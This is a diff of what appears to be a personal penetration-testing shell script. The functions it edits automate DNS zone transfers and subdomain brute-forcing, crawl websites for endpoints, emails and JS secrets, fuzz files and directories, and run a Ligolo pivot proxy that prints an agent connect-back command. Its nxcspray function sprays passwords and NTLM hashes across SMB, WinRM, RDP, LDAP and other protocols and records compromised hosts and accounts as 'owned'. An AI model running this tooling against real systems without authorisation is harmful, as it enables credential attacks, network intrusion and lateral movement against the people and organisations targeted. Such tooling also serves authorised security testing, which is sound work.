@@ -336,46 +336,46 @@ nscan(){
 
 	    while true; do
         	read -r dnsdom\?"[+] INPUT A DOMAIN TO ENUMERATE (CTRL-C TO EXIT): "
-        	if [[ ! -z $dnsdom ]]; then
+        	if [[ ! -z "$dnsdom" ]]; then
                     rm /tmp/ns_$dnsdom.txt /tmp/zones_$dnsdom.txt &>/dev/null
                     echo -e "\n[+] REQUESTING AD DOMAIN RECORDS\n"
                     nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='$dnsdom'"
 
                     echo -e "\n[+] REQUESTING \"NS\" RECORDS FOR \"$dnsdom\"\n"
-                    ns_records=$(dig ns $dnsdom @$1 -p $2 +short | grep -v "timed out") && echo $ns_records
-                    ref_chk=$(dig ns $dnsdom @$1 -p $2 | grep REFUSED | grep -v "timed out")
+                    ns_records=$(dig ns "$dnsdom" @$1 -p $2 +short | grep -v "timed out") && echo $ns_records
+                    ref_chk=$(dig ns "$dnsdom" @$1 -p $2 | grep REFUSED | grep -v "timed out")
 
                     if [[ ! -z $ref_chk || -z $ns_records ]]; then
                         echo -e "\n[+] REQUESTING \"A\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
-                        dig a $dnsdom @$1 -p $2 | grep -i $dnsdom
+                        dig a "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"
 
                         echo -e "\n[+] REQUESTING \"AAAA\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
-                        dig aaaa $dnsdom @$1 -p $2 | grep -i $dnsdom
+                        dig aaaa "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"
 
                         echo -e "\n[+] REQUESTING \"MX\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
-                        dig mx $dnsdom @$1 -p $2 | grep -i $dnsdom
+                        dig mx "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"
 
                         echo -e "\n[+] REQUESTING \"TXT\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
-                        dig txt $dnsdom @$1 -p $2 | grep -i $dnsdom
+                        dig txt "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"
 
                         echo -e "\n[+] REQUESTING \"CNAME\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
-                        dig cname $dnsdom @$1 -p $2 | grep -i $dnsdom
+                        dig cname "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"
 
                         echo -e "\n[+] REQUESTING \"HINFO\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
-                        dig hinfo $dnsdom @$1 -p $2 | grep -i $dnsdom
+                        dig hinfo "$dnsdom" @$1 -p $2 | grep -i "$dnsdom"
 
                         echo -e "\n[+] REQUESTING \"ANY\" RECORDS FOR \"$dnsdom\" OVER DNS IP\n"
-                        dig any $dnsdom @$1 -p $2 +noall +answer | awk '{for(i=1;i<=3;i++) $i=""; sub(/^[ \t]+/, ""); print}' | awk -F '\t' '{print $1 "\t" $2}'
+                        dig any "$dnsdom" @$1 -p $2 +noall +answer | awk '{for(i=1;i<=3;i++) $i=""; sub(/^[ \t]+/, ""); print}' | awk -F '\t' '{print $1 "\t" $2}'
 
                         if [[ ! -z $ns_records ]]; then
                             echo -e "[+] NS REQUEST WAS REFUSED, ATTEMPTING ZONE TRANSFER OVER DNS IP\n"
-                            axfr_resp=$(dig axfr $dnsdom @$1 -p $2 +noall +answer | grep -v "timed out")
+                            axfr_resp=$(dig axfr "$dnsdom" @$1 -p $2 +noall +answer | grep -v "timed out")
 
                             if [[ -z $axfr_resp ]]; then
                                 echo -e "\n[+] ZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
                                 echo $2 > /tmp/ns_$dnsdom.txt
                                 cur=$(pwd) && cd ~/tools/subbrute
-                                python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
+                                python2 subbrute.py "$dnsdom" -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                                 cd $cur
                             else
                                 echo $axfr_resp
@@ -397,37 +397,37 @@ nscan(){
 
                         echo -e "\n[+] REQUESTING \"A\" RECORDS\n"
                         while read zone; do
-                            dig a $dnsdom @$zone -p $2 +short
+                            dig a "$dnsdom" @$zone -p $2 +short
                         done < /tmp/ns_$dnsdom.txt
 
                         echo -e "\n[+] REQUESTING \"AAAA\" RECORDS\n"
                         while read zone; do
-                            dig aaaa $dnsdom @$zone -p $2 +short
+                            dig aaaa "$dnsdom" @$zone -p $2 +short
                         done < /tmp/ns_$dnsdom.txt
 
                         echo -e "\n[+] REQUESTING \"MX\" RECORDS\n"
                         while read zone; do
-                            dig mx $dnsdom @$zone -p $2 +short
+                            dig mx "$dnsdom" @$zone -p $2 +short
                         done < /tmp/ns_$dnsdom.txt
 
                         echo -e "\n[+] REQUESTING \"TXT\" RECORDS\n"
                         while read zone; do
-                            dig txt $dnsdom @$zone -p $2 +short
+                            dig txt "$dnsdom" @$zone -p $2 +short
                         done < /tmp/ns_$dnsdom.txt
 
                         echo -e "\n[+] REQUESTING \"CNAME\" RECORDS\n"
                         while read zone; do
-                            dig cname $dnsdom @$zone -p $2 +short
+                            dig cname "$dnsdom" @$zone -p $2 +short
                         done < /tmp/ns_$dnsdom.txt
 
                         echo -e "\n[+] REQUESTING \"ANY\" RECORDS\n"
                         while read zone; do
-                            dig any $dnsdom @$zone -p $2 +noall +answer | awk '{for(i=1;i<=3;i++) $i=""; sub(/^[ \t]+/, ""); print}' | awk -F '\t' '{print $1 "\t" $2}'
+                            dig any "$dnsdom" @$zone -p $2 +noall +answer | awk '{for(i=1;i<=3;i++) $i=""; sub(/^[ \t]+/, ""); print}' | awk -F '\t' '{print $1 "\t" $2}'
                         done < /tmp/ns_$dnsdom.txt
 
                         echo -e "\n[+] ATTEMPTING ZONE TRANSFER OVER ALL ZONES\n"
                         while read zone; do
-                            axfr_resp=$(dig axfr $dnsdom @$zone -p $3 +noall +answer | grep -v "timed out")
+                            axfr_resp=$(dig axfr "$dnsdom" @$zone -p $2 +noall +answer | grep -v "timed out")
                             if [[ ! -z $axfr_resp ]]; then
                                 echo $axfr_resp
                                 break
@@ -436,7 +436,7 @@ nscan(){
                         if [[ -z $axfr_resp ]]; then
                             echo -e "\n[+] ZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
                             cur=$(pwd) && cd ~/tools/subbrute
-                            python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
+                            python2 subbrute.py "$dnsdom" -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                             cd $cur
                         fi
                     fi
@@ -739,50 +739,68 @@ techscan(){
         whatweb -a 3 $1
 }
 
+
 crawl(){
         local target=$1
-        local cookie=${2:-"rand=rand"} 
+        local cookie=${2:-"rand=rand"}
         echo -e "------------------WEB CRAWLING----------------------\n"
         dom=$(echo $1 | unfurl format %d)
+        is_ip=$(echo $dom | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
+        if [[ -z $is_ip ]]; then
+            root_dom=$(echo $dom | awk -F. '{print $(NF-1)"."$NF}')
+        else
+            root_dom=$dom
+        fi
 
-        echo -e "\nGATHERING ENDPOINTS\n"
-        gospider --no-redirect --cookie "$cookie" -t 5 -s $1 --sitemap -d 3 --subs --js > /tmp/crawled_$dom.txt
-        cat /tmp/crawled_$dom.txt | grep -E "\[href\]|\[url]" | grep -vE "\.css|\.js$|\.woff|\.woff2|\.ttf|\.png|\.jpg|\.jpeg|\.gif|\?.*=" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++' | grep -vif /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt
+        echo -e "\nCRAWLING URL \"$1\" AT DEPTH 3...\n"
+        katana -up &>/dev/null
+        
+        # Build Katana command with cookie if provided
+        if [[ -n "$cookie" && "$cookie" != "rand=rand" ]]; then
+            katana -u "$target" -H "Cookie: $cookie" -jc -jsl -kf all -aff -fx -td -xhr -j -or -nc -silent -do -cs "$dom" -o crawled_$dom.txt >/dev/null
+        else
+            katana -u "$target" -jc -jsl -kf all -aff -fx -td -xhr -j -or -nc -silent -do -cs "$dom" -o crawled_$dom.txt >/dev/null
+        fi
 
-        echo -e "\nQUERY STRINGS\n"
-        cat /tmp/crawled_$dom.txt | grep -E "\[href\]|\[url]" | grep -E "\?.*=" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | qsreplace FUZZ | awk '!seen[$0]++'
+        echo -e "\n[+] ENDPOINTS\n"
+        cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq 'select(.request.method == "GET" and (.request.endpoint | test("[?&]") | not))' | jq '.request.endpoint' | tr -d '"' | grep "$root_dom" --color=never
 
-        echo -e "\nFORM FIELDS\n"
-        cat /tmp/crawled_$dom.txt | grep -E "form\]" | grep -vE "\?.*=" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++'
+        echo -e "\n[+] SUBDOMAINS\n"
+        cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq 'select(.request.method == "GET" and (.request.endpoint | test("[?&]") | not))' | jq '.request.endpoint' | tr -d '"' | grep "$root_dom" --color=never | unfurl format %d | grep "$dom" -wxv --color=never | tee -a /tmp/crawled_$dom.txt
+        cat crawled_$dom.txt | jq '.response.body' | grep -Po "\b[A-Za-z0-9][A-Za-z0-9.-]*\.$root_dom\b" --color=never | grep "$dom" -wxv --color=never | tee -a /tmp/crawled_$dom.txt
+        cat /tmp/crawled_$dom.txt | sort -u
 
-        echo -e "\nSUBDOMAINS\n"
-        cat /tmp/crawled_$dom.txt | grep -E "\[subdomains\]" | awk -F" " '{print $3}' | awk '!seen[$0]++'
+        echo -e "\n[+] GET QUERIES\n"
+        cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq -s 'unique_by(.request.endpoint | sub("\\?.*"; "?"))' | jq 'map(select(.request.method == "GET" and (.request.endpoint | contains("?"))))' | jq 'map(.request.endpoint).[]' | tr -d '"' | grep "$root_dom" | qsreplace FUZZ
 
-        echo -e "\nJS FILES\n"
-        cat /tmp/crawled_$dom.txt | grep -E "\[javascript\]" | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++' > /tmp/jstmp_$dom.txt
-        while read line; do
-            type=$(curl -s $line -I | grep -i Content-Type | awk -F" " '{print $2}' | head -n 1)
-            if [[ $type =~ "javascript" ]]; then
-                echo $line | anew -q /tmp/js_$dom.txt
-            fi
-        done < /tmp/jstmp_$dom.txt
+        echo -e "\n[+] ENDPOINTS WITH FORMS\n"
+        cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq 'select(.request.method == "POST")' | jq 'map(.request.endpoint).[]'
 
-        echo -e "\nEXTRACTING COMMENTS\n"
-        ReconSpider.py $1 &>/dev/null
-        cat results.json | jq '.comments[]'
+        echo -e "\n[+] TECHNOLOGIES\n"
+        cat crawled_$dom.txt | jq '.response.technologies' | jq -s 'add | unique' | jq '.[]'
 
-        echo -e "\nEXTRACING E_MAILS\n"
-        cat results.json | jq '.emails[]'
+        echo -e "\n[+] COMMENTS\n"
+        cat crawled_$dom.txt | jq '.response.body' | grep -Po '<!-- \K.*?(?= -->)' | sort -u
 
-        echo -e "\nJS LINK MINING\n"
-        cat /tmp/crawled_$dom.txt | grep -E "\[linkfinder\]" | awk -F" " '{print $6}' | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++' | grep -v "www.w3.org" | grep -v "reactjs.org" | grep -v "mui.com"
+        echo -e "\n[+] E_MAILS\n"
+        cat crawled_$dom.txt | jq '.response.body' | stdbuf -oL grep -Eo "[A-Za-z0-9._%+-]+@$root_dom" | stdbuf -oL awk '!seen[$0]++'
 
-        echo -e "\nJS SECRET MINING\n"
-        cat /tmp/js_$dom.txt | while read line; do; /home/damuna/tools/SecretFinder/venv/bin/python3 ~/tools/SecretFinder/SecretFinder.py -i $1 -e -g 'jquery;bootstrap;api.google.com' -o cli | grep -v "twilio_" | grep -v "possible_" | grep -v "google_captcha"; done
+        echo -e "\n[+] JS FILES\n"
+        cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | grep "\.js" | awk '{print $2}' | tr -d '"' | anew /tmp/js_$dom.txt
 
-        echo -e "\nBROKEN LINK 404 HIJACKING\n"
-        blc -ro -f -i --filter-level 2 -g $1 | grep -i HTTP_404
+        echo -e "\n[+] CHECKING SECRETS IN JS FILES"
+        if [[ -f /tmp/js_$dom.txt && -s /tmp/js_$dom.txt ]]; then
+            cat /tmp/js_$dom.txt | mantra -s
+            rm /tmp/js_$dom.txt
+        else
+            echo "No JS files found to check"
+        fi
+
+        echo -e "\n[+] 404 LINK HIJACKING\n"
+        blc -ro -f -i --filter-level 2 -g "$target" | grep -i HTTP_404
 }
+
+
 # Extension Selector Function
 select_extension() {
   local options=(
@@ -838,10 +856,10 @@ filefuzz(){
     local cookie=${2:-"rand=rand"}
 
     echo -e "\n----------------RECURSIVE FILE FUZZING---------------------\n"
-    ffuf -H "Cookie: $cookie" -mc all -fc 404,400,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /home/damuna/wordlists/filefuzz.txt 
+    ffuf -H "Cookie: $cookie" -mc all -fc 404,400,503,429,500 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /home/damuna/wordlists/filefuzz.txt 
     
     echo -e "\n----------------NON RECURSIVE FILE FUZZING---------------------\n"
-    ffuf -H "Cookie: $cookie" -mc all -fc 404,400,503,429,500 -t 10 -ac -acs advanced -ic -u $1/FUZZ -c -w /home/damuna/wordlists/filefuzz.txt 
+    ffuf -H "Cookie: $cookie" -mc all -fc 404,400,503,429,500 -ac -acs advanced -ic -u $1/FUZZ -c -w /home/damuna/wordlists/filefuzz.txt 
 
     echo -e "\n--------------------NUCLEI FILE EXPOSURE----------------------------\n"
     nuclei -up &>/dev/null && nuclei -ut &>/dev/null
@@ -853,10 +871,10 @@ extfuzz(){
     select_extension
     echo -e "\n--------------------RECURSIVE EXTENSION FUZZING------------------\n"
     urlgen $1
-    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /home/damuna/wordlists/combined_words_no_dot.txt -e $ext
+    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /home/damuna/wordlists/combined_words_no_dot.txt -e $ext
 
     echo -e "\n--------------------NON RECURSIVE EXTENSION FUZZING------------------\n"
-    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -ic -u $1/FUZZ -c -w /home/damuna/wordlists/combined_words_no_dot.txt -e $ext 
+    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -ac -acs advanced -ic -u $1/FUZZ -c -w /home/damuna/wordlists/combined_words_no_dot.txt -e $ext 
 }
 
 # Directory Discovery
@@ -865,10 +883,10 @@ dirfuzz(){
     local cookie=${2:-"rand=rand"}
 
     echo -e "-----------------RECURSIVE DIRECTORY FUZZING------------------\n"
-    ffuf -H "Cookie: $cookie" -mc all -fc 400,404,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
+    ffuf -H "Cookie: $cookie" -mc all -fc 400,404,503,429,500 -ac -acs advanced -r -ic -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
     
     echo -e "-----------------NON RECURSIVE DIRECTORY FUZZING------------------\n"
-    ffuf -H "Cookie: $cookie" -mc all -fc 400,404,503,429,500 -t 10 -ac -acs advanced -ic -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
+    ffuf -H "Cookie: $cookie" -mc all -fc 400,404,503,429,500 -ac -acs advanced -ic -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
 
 }
 
@@ -953,9 +971,10 @@ msflisten(){
 
 smtpserv(){
     chnic
-    echo -e "OPENING SMTP 'DebuggingServer' AT $ip:2525\n"
-    python2 -m smtpd -n -c DebuggingServer $ip:2525
+    echo -e "OPENING SMTP 'DebuggingServer' AT $ip:25\n"
+    python2 -m smtpd -n -c DebuggingServer $ip:25
 }
+
 
 httpsserv() {
     chnic
@@ -1079,11 +1098,33 @@ paramfuzz(){
     nuclei -u $1 -headless -dast
 }
 
+# Start Ligolo Proxy
+ligstart(){
+    chnic
+    mkdir -p ./LIGOLO_DATA && cd ./LIGOLO_DATA
+    local port="${1:-11601}"
+
+    echo -e "\n[+] COPYING LIGOLO AGENTS IN DATA DIRECTORY\n"
+    cp ~/tools/LIGOLO_AGENTS/agent .
+    cp ~/tools/LIGOLO_AGENTS/agent.exe .
+
+    echo -e "\n[+] OPENING LIGOLO PROXY ON \"$ip:$port\"\n"
+    echo -e "- ./agent -connect $ip:$port -ignore-cert"
+    ligcreate ligolo >/dev/null
+    sudo ligolo-proxy -selfcert -nobanner -laddr "$ip:$port"
+    cd ..
+    ligdel ligolo
+    sudo rm -rf ./LIGOLO_DATA
+}
+
 ligcreate(){
     usr=$(whoami)
     sudo ip tuntap add user $usr mode tun $1
     sudo ip link set $1 up
-    sudo ip route add $2 dev $1
+}
+
+ligdel(){
+    sudo ip link delete $1
 }
 
 # Password spraying
@@ -1266,14 +1307,6 @@ dnsrec(){
         echo "\n\------------------------ $record Record --------------------------\n"
         dig $record $1 @$2
     done
-}
-
-ligstart(){
-    mkdir -p ./LIGOLO_DATA && cd ./LIGOLO_DATA
-    chnic
-    echo "./agent -connect $ip:${1:-11601} -ignore-cert"
-    sudo cp ~/tools/LIGOLO_AGENTS/ligolo-ng.yaml .
-    sudo ligolo-proxy -selfcert -laddr "$ip:${1:-11601}"
 }
 
 # Default credentials for services / applications
@@ -2309,48 +2342,44 @@ xssgen() {
 
 # NXC Spraying Wrapper
 nxcspray(){
-    protocols=("smb" "winrm" "rdp" "mssql" "ldap" "vnc" "ssh" "nfs" "ftp" "wmi")
 
-    dc_ip=$(sudo nmap -p88 -iL $1 -n -Pn --disable-arp-ping -sT --open -oG - | awk '/88\/open/ {print $2}')
-    if [[ -z $dc_ip ]]; then
-        echo -e "\n[-] DC IP NOT FOUND, WILL SKIP KERBEROS AUTHENTICATION\n"
-    elif [[ $(echo $dc_ip | wc -l) != 1 ]]; then
-        read -r dc_ip\?"[-] MULTIPLE DC IPS DETECTED, INPUT ONE MANUALLY FOR KB AUTHENTICATION: "
-        dom=$(cat /etc/hosts | grep -i $dc_ip | awk '{print $3}' | head -n 1)
-        if [[ -z $dom ]]; then
-            krbconf $dc_ip
-            dom=$(cat /etc/hosts | grep -i $dc_ip | awk '{print $3}' | head -n 1)
-        fi
-        echo -e "\n[+] DOMAIN SET TO \"$dom\"\n"
-
-        dc_fqdn=$(cat /etc/hosts | grep -i $dc_ip | awk '{print $2}' | head -n 1)
-        rm /tmp/spray_$dc_fqdn.txt &>/dev/null
+    if [[ $# -eq 0 ]]; then
+        echo "Usage: nxcspray <target> <user> <pass|hash> {<domain>} {<DC FQDN>}"
+        return 1
     fi
+    
+    dc_ip="$4"
+    dc_fqdn="$5"
+    protocols=("smb" "winrm" "rdp" "mssql" "ldap" "vnc" "wmi" "nfs" "ftp" "ssh")
+    loc_protocols=("smb" "winrm" "rdp" "mssql")
+
 
     echo -e "\n[+] - Domain Authentication"
     for protocol in "${protocols[@]}"; do
         if [[ $3 == $2 ]]; then
             echo -e "[+] - USER:USER Mode Detected\n"
-            nxc $protocol $1 -u $2 -p $3 --continue-on-success --no-bruteforce 2>/dev/null | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.txt
+            nxc $protocol $1 -u $2 -p $3 --continue-on-success --no-bruteforce | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
         elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-            nxc $protocol  $1 -u $2 -p $3 --continue-on-success 2>/dev/null | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.txt
+            nxc $protocol  $1 -u $2 -p $3 --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
         else
-            nxc $protocol  $1 -u $2 -H $3 --continue-on-success 2>/dev/null | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.txt
+            nxc $protocol  $1 -u $2 -H $3 --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
         fi
-        cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
-        cat /tmp/spray_$dc_fqdn.txt | grep + | grep "SMB\|LDAP" | grep 'Pwn3d!' | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
+        cat /tmp/spray_$1.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
+        cat /tmp/spray_$1.txt | grep + | grep "SMB\|LDAP" | grep 'Pwn3d!' | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
     done
 
     echo -e "\n[+] - Local Authentication"
-    for protocol in "${protocols[@]}"; do
+    for protocol in "${loc_protocols[@]}"; do
         if [[ $3 == $2 ]]; then
             echo -e "[+] - USER:USER Mode Detected\n"
-            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce --local-auth 2>/dev/null | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.txt
+            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.txt
         elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --local-auth 2>/dev/null | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.tx
+            nxc $protocol  $1 -u $2 -p $3 --continue-on-success --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
         else
-            nxc $protocol  $1 -u $2 -H $3 --continue-on-success --local-auth 2>/dev/null | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.tx
+            nxc $protocol  $1 -u $2 -H $3 --continue-on-success --local-auth  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
         fi
+        cat /tmp/spray_$1.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
+        cat /tmp/spray_$1.txt | grep + | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
     done
 
     if [[ ! -z $dc_fqdn ]]; then
@@ -2358,14 +2387,14 @@ nxcspray(){
         for protocol in "${protocols[@]}"; do
             if [[ $3 == $2 ]]; then
                 echo -e "[+] - USER:USER Mode Detected\n"
-                nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce -k --kdcHost $dc_fqdn 2>/dev/null | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.tx
+                nxc $protocol  $1 -u $2 -p $3 --continue-on-success --no-bruteforce -k --kdcHost $dc_fqdn  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
             elif [[ -z $(cat $3 | head -n 1 | grep -E '[0-9a-fA-F]{32}') ]]; then
-                nxc $protocol  $1 -u $2 -p $3 -k --kdcHost $dc_fqdn --continue-on-success 2>/dev/null | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.tx
+                nxc $protocol  $1 -u $2 -p $3 -k --kdcHost $dc_fqdn --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
             else
